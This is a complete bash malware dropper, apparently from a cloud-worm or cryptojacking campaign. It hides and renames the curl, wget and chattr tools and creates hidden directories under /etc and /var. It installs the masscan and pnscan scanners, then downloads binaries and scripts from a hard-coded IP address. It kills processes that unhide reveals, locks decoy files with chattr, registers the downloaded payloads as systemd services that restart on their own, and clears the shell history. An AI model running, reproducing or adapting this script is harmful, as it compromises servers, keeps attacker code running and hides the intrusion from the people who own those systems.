#!/bin/bash
m_command()
{
if [ -x /bin/chattr ];then
    mv /bin/chattr /bin/zzhcht
elif [ -x /usr/bin/chattr ];then
    mv /usr/bin/chattr /usr/bin/zzhcht
fi
if [ -x /bin/zzhcht ];then
    export CHATTR=/bin/zzhcht
elif [ -x /usr/bin/zzhcht ];then
    export CHATTR=/usr/bin/zzhcht
else
    export CHATTR=chattr
fi
if [ -f /bin/curl ];then
    export CURL_CMD="/bin/curl"
elif [ -f /usr/bin/curl ];then
    export CURL_CMD="/usr/bin/curl"
fi
if [ -f /bin/wget ];then
    export WGET_CMD="/bin/wget"
elif [ -f /usr/bin/wget ];then
    export WGET_CMD="/usr/bin/wget"
fi

if [ -x "/usr/bin/wge" -o -x "/bin/wge" ];then
    if [ -f /bin/wge ];then
        export WGET_CMD="/bin/wge"
    elif [ -f /usr/bin/wge ];then
        export WGET_CMD="/usr/bin/wge"
    fi
    mv /bin/wge /bin/wls || mv /usr/bin/wge /usr/bin/wls
fi
if [ -x "/usr/bin/wd1" -o -x "/bin/wd1" ];then
    if [ -f /usr/bin/wd1 ];then
        export WGET_CMD="/usr/bin/wd1"
    elif [ -f /bin/wd1 ];then
        export WGET_CMD="/bin/wd1"
    fi
    mv /bin/wd1 /bin/wls || mv /usr/bin/wd1 /usr/bin/wls 
fi
if [ -x "/usr/bin/wget1" -o -x "/bin/wget1" ];then
    if [ -f /bin/wget1 ];then
        export WGET_CMD="/bin/wget1"
    elif [ -f /usr/bin/wget1 ];then
        export WGET_CMD="/usr/bin/wget1"
    fi
    mv /bin/wget1 /bin/wls || mv /usr/bin/wget1 /usr/bin/wls
fi
if [ -x "/usr/bin/wdt" -o -x "/bin/wdt" ];then
    if [ -f /bin/wdt ];then
        export WGET_CMD="/bin/wdt"
    elif [ -f /usr/bin/wdt ];then
        export WGET_CMD="/usr/bin/wdt"
    fi
    mv /bin/wdt /bin/wls || mv /usr/bin/wdt /usr/bin/wls
fi
if [ -x "/usr/bin/wdz" -o -x "/bin/wdz" ];then
    if [ -f /usr/bin/wdz ];then
        export WGET_CMD="/usr/bin/wdz"
    elif [ -f /bin/wdz ];then
        export WGET_CMD="/bin/wdz"
    fi
    cp /bin/wdz /bin/wls || cp /usr/bin/wdz /usr/bin/wls
fi
if [ -x "/usr/bin/xget" -o -x "bin/xget" ];then
    if [ -f /bin/xget ];then
        export WGET_CMD="/bin/xget"
    elif [ -f /usr/bin/xget ];then
        export WGET_CMD="/usr/bin/xget"
    fi 
    mv /bin/xget /bin/wls || /usr/bin/xget /usr/bin/wls
fi 
if [ -x "/bin/wls" ];then
    export WGET_CMD="/bin/wls"
elif [ -x "/usr/bin/wls" ];then
    export WGET_CMD="/usr/bin/wls"
else
    if [ $(command -v yum) ];then  
        rpm -e --nodeps wget 
        yum remove -y wget
        yum install -y wget  
    else
        apt-get remove -y wget
        apt-get install -y wget
    fi
    mv /bin/wget /bin/wls || mv /usr/bin/wget /usr/bin/wls
    if [ -f /bin/wls ];then
        export WGET_CMD="/bin/wls" 
    elif [ -f /usr/bin/wls ];then
        export WGET_CMD="/usr/bin/wls"
    fi  
fi

if [ -x "/usr/bin/cd1" -o -x "/bin/cd1" ];then
    if [ -f /bin/cd1 ];then
        export CURL_CMD="/bin/cd1"
    elif [ -f /usr/bin/cd1 ];then
        export CURL_CMD="/usr/bin/cd1"
    fi
    mv /bin/cd1 /bin/cls || mv /usr/bin/cd1 /usr/bin/cls
fi
if [ -x "/usr/bin/curl" -o -x "/bin/curl" ];then 
    if [ -f /bin/curl ];then
        export CURL_CMD="/bin/curl"
    elif [ -f /usr/bin/curl ];then
        export CURL_CMD="/usr/bin/curl"
    fi
    mv /bin/curl /bin/cls || mv /usr/bin/curl /usr/bin/cls
fi
if [ -x "/usr/bin/cdz" -o -x "/bin/cdz" ];then
    if [ -f /bin/cdz ];then
        export CURL_CMD="/bin/cdz"
    elif [ -f /usr/bin/cdz ];then
        export CURL_CMD="/usr/bin/cdz"
    fi
    cp /bin/cdz /bin/cls || cp /usr/bin/cdz /usr/bin/cls
fi
if [ -x "/usr/bin/cur" -o -x "/bin/cur" ];then
    if [ -f /bin/cur ];then
        export CURL_CMD="/bin/cur"
    elif [ -f /usr/bin/cur ];then
        export CURL_CMD="/usr/bin/cur"
    fi
    mv /bin/cur /bin/cls || mv /usr/bin/cur /usr/bin/cls
fi
if [ -x "/usr/bin/TNTcurl" -o -x "/bin/TNTcurl" ];then
    if [ -f /bin/TNTcurl ];then
        export CURL_CMD="/bin/TNTcurl"
    elif [ -f /usr/bin/TNTcurl ];then
        export CURL_CMD="/usr/bin/TNTcurl"
    fi
    mv /bin/TNTcurl /bin/cls || mv /usr/bin/TNTcurl /usr/bin/cls
fi
if [ -x "/usr/bin/curltnt" -o -x "/bin/curltnt" ];then
    if [ -f /bin/curltnt ];then 
        export CURL_CMD="/bin/curltnt"
    elif [ -f /usr/bin/curltxt ];then
        export CURL_CMD="/usr/bin/curltnt"
    fi
    mv /bin/curltnt /bin/cls || mv /usr/bin/curltnt /usr/bin/cls
fi
if [ -x "/usr/bin/curl1" -o -x "/bin/curl1" ];then
    if [ -f /bin/curl1 ];then
        export CURL_CMD="/bin/curl1"
    elif [ -f /usr/bin/curl1 ];then
        export CURL_CMD="/usr/bin/curl1"
    fi
    mv /bin/curl1 /bin/cls || mv /usr/bin/curl1 /usr/bin/cls
fi
if [ -x "/usr/bin/cdt" -o -x "/bin/cdt" ];then
    if [ -f /bin/cdt ];then
        export CURL_CMD="/bin/cdt"
    elif [ -f /usr/bin/cdt ];then
        export CURL_CMD="/usr/bin/cdt"
    fi
    mv /bin/cdt /bin/cls || mv /usr/bin/cdt /usr/bin/cls
fi
if [ -x "/usr/bin/xcurl" -o -x "/bin/xcurl" ];then
    if [ -f /bin/xcurl ];then
        export CURL_CMD="/bin/xcurl"
    elif [ -f /usr/bin/xcurl ];then
        export CURL_CMD="/usr/bin/xcurl"
    fi
    mv /bin/xcurl /bin/cls || mv /usr/bin/xcurl /usr/bin/wls
fi
if [ -x "/usr/bin/cls" ];then
    export CURL_CMD="/usr/bin/cls"
elif [ -x "/bin/cls" ];then
    export CURL_CMD="/bin/cls"
else
    if [ $(command -v yum) ];then 
        rpm -e --nodeps curl
        yum remove curl
        yum install -y curl  
    else
        apt-get remove curl
        apt-get install -y  curl
    fi
    mv /bin/curl /bin/cls || mv /usr/bin/curl /usr/bin/cls
    if [ -f /bin/cls ];then
        export CURL_CMD="/bin/cls"
    elif [ -f /usr/bin/cls ];then
        export CURL_CMD="/usr/bin/cls"
    fi
fi 
}
m_command
mkdir -p /etc/...
cd /etc/...
mkdir -p .ice-unix/ && chmod -R 777 .ice-unix
sleep 1
if [ -f .watch ];then
    rm -rf .watch
    exit 0
fi
sleep 1
echo 1 > .watch 

if [ $(command -v apt-get) ];then
    export DEBIAN_FRONTEND=noninteractive
    apt-get update --fix-missing
    apt-get update -y --exclude=procps* psmisc*
    apt-get install -y debconf-doc
    apt-get install -y build-essential
    apt-get install -y libpcap0.8-dev libpcap0.8
    apt-get install -y libpcap*
    apt-get install -y make
    apt-get install -y gcc
    apt-get install -y git
    apt-get install -y redis-server
    apt-get install -y redis-tools
    apt-get install -y redis
    apt-get install -y iptables
    #apt-get install -y wget curl
    apt-get install -y unhide
    apt-get install -y jq
    apt-get install -y bash
    apt-get install -y libpcap-dev
    apt-get install -y docker
fi
if [ $(command -v yum) ];then
    yum update -y --exclude=procps* psmisc*
    yum install -y epel-release
    yum update -y --exclude=procps* psmisc*
    yum install -y git
    yum install -y iptables 
    yum install -y make
    yum install -y gcc
    yum install -y redis
    yum install -y libpcap
    yum install -y libpcap-devel
    #yum install -y wget curl
    yum install -y unhide
    yum install -y jq
    yum install -y bash
    yum install -y libcap-devel
    yum install -y docker
    
fi
if ! type zgrab ;then
    ${WGET_CMD} http://205.185.118.246/bWVkaWEK/zgrab -O /usr/bin/zgrab && chmod a+x /usr/bin/zgrab
fi 
version=$(cat /etc/redhat-release |awk '{print $4}'|awk -F "." '{print $1}')
if [ $version -eq 7 ]; then
    echo  "system release centos 7"
else
    echo   "system release centos 8" && ln -s /usr/lib64/libpcap.so.1 /usr/lib64/libpcap.so
fi
sleep 1
echo "Software Installed"
ddir="/usr/sbin/unhide"
${ddir} quick |grep PID:|awk '{print $4}'|xargs -I % kill -9 % 2>/dev/null
${CHATTR} -i /usr/bin/ip6network
${CHATTR} -i /usr/bin/kswaped
${CHATTR} -i /usr/bin/irqbalanced
${CHATTR} -i /usr/bin/rctlcli
${CHATTR} -i /usr/bin/systemd-network
${CHATTR} -i /usr/bin/pamdicks
echo 1 > /usr/bin/ip6network
echo 2 > /usr/bin/kswaped
echo 3 > /usr/bin/irqbalanced
echo 4 > /usr/bin/rctlcli
echo 5 > /usr/bin/systemd-network
echo 6 > /usr/bin/pamdicks
${CHATTR} +i /usr/bin/ip6network
${CHATTR} +i /usr/bin/kswaped
${CHATTR} +i /usr/bin/irqbalanced
${CHATTR} +i /usr/bin/rctlcli
${CHATTR} +i /usr/bin/systemd-network
${CHATTR} +i /usr/bin/pamdicks
  
if ! [ -x "$(command -v httpd_2.5)" ]; then
rm -rf /var/lib/apt/lists/*
rm -rf x1.tar.gz
sleep 1
${CURL_CMD} -sL -o x1.tar.gz http://205.185.118.246/bWVkaWEK/1.0.4.tar.gz || ${WGET_CMD} -q -O .x112 http://205.185.118.246/bWVkaWEK/1.0.4.tar.gz
sleep 1
[ -f x1.tar.gz ] && tar zxf x1.tar.gz && cd masscan-1.0.4 && make && make install && cd .. && rm -rf masscan-1.0.4
 
fi 
sleep 3 && rm -rf .watch
if ! ( [ -x /usr/local/bin/pnscan ] || [ -x /usr/bin/pnscan ] ); then
${CURL_CMD} -sL -o .x112 http://205.185.118.246/bWVkaWEK/p.tar || ${WGET_CMD} -q -O .x112 http://205.185.118.246/bWVkaWEK/p.tar
sleep 1
[ -f .x112 ] && tar xf .x112&& cd pnscan && ./configure && make && make install && cd .. && rm -rf pnscan .x112
 
fi 
if ! type docker 2>/dev/null; then ${CURL_CMD}  -sLk https://get.docker.com | bash ; fi
if ! type masscan 2>/dev/null 1>/dev/null; then yum -y install epel-release && yum clean all && yum -y install masscan ; fi

mkdir -p /etc/.httpd/...
cd /etc/.httpd/...
if [ ! -f /etc/.httpd/.../httpd ];then
    ${CURL_CMD} -fsSL http://205.185.118.246/s3f815/d/c.sh -o httpd
    chmod a+x httpd 
fi
cat >/tmp/m.service <<EOL
[Service]
ExecStart=/etc/.httpd/.../httpd
WorkingDirectory=/etc/.httpd/...
Restart=always 
RestartSec=30
[Install]
WantedBy=default.target
EOL
mkdir -p /var/.httpd/...
cd /var/.httpd/...
if [ ! -f /var/.httpd/.../httpd ];then
    ${CURL_CMD} -fsSL http://205.185.118.246/s3f815/d/d.sh -o httpd
    chmod a+x httpd
    echo "FUCK chmod2"
    ls -al /etc/.httpd/...
fi
cat >/tmp/p.service <<EOL
[Service]
ExecStart=/var/.httpd/.../httpd
WorkingDirectory=/var/.httpd/...
Restart=always 
RestartSec=30
[Install]
WantedBy=default.target
EOL
mv /tmp/m.service /etc/systemd/system/zzhr.service
mv /tmp/p.service /etc/systemd/system/zzhd.service 
sudo systemctl enable zzhr.service
sudo systemctl enable zzhd.service
sudo systemctl daemon-reload
sudo systemctl start zzhd.service
sudo systemctl start zzhr.service

history -c
